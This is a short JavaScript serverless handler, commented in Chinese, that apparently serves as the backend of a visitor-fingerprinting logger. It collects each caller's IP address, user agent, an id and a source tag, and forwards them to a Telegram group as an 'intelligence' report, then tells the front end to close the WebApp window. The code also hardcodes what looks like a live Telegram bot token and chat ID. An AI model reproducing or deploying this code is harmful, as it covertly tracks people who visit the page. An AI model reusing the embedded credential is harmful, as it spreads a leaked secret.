export default async function handler(req, res) {
    try {
        // 1. 获取参数
        const { id, ua, chat } = req.query;
        const ip = req.headers['x-forwarded-for'] || "未知IP";

        // 2. 这里的变量名我统一了，不要乱改名字哦
        const MY_TOKEN = '8790086518:AAF103Mo8Uk_UYVdURZrZFh1Zjc2wpPV4hU'; 
        const MY_CHAT = '-1003659768706'; 

        const content = `🚨 指纹上报\nID: ${id}\nIP: ${ip}\n设备: ${ua}\n来源: ${chat}`;

        // 3. 关键点：加了 await 确保等电报的结果
        const tg_res = await fetch(`https://api.telegram.org/bot${MY_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: MY_CHAT,
                text: content
                // 这里暂时不加 Markdown，防止符号冲突报错
            })
        });

        const result = await tg_res.json();

// 4. 根据电报的真实反馈回传给浏览器
        if (result.ok) {
            // 这里加上 success: true，方便前端判断并关闭 WebApp 窗口
            return res.status(200).json({ 
                status: "SUCCESS", 
                success: true, 
                info: "情报已送达群" 
            });
        } else {
            return res.status(200).json({ 
                status: "TG_ERROR", 
                success: false, 
                detail: result.description 
            });
        }
    } catch (error) {
        // 捕获所有代码错误，防止 500 报错页面
        return res.status(200).json({ status: "CODE_ERROR", message: error.message });
    }
}
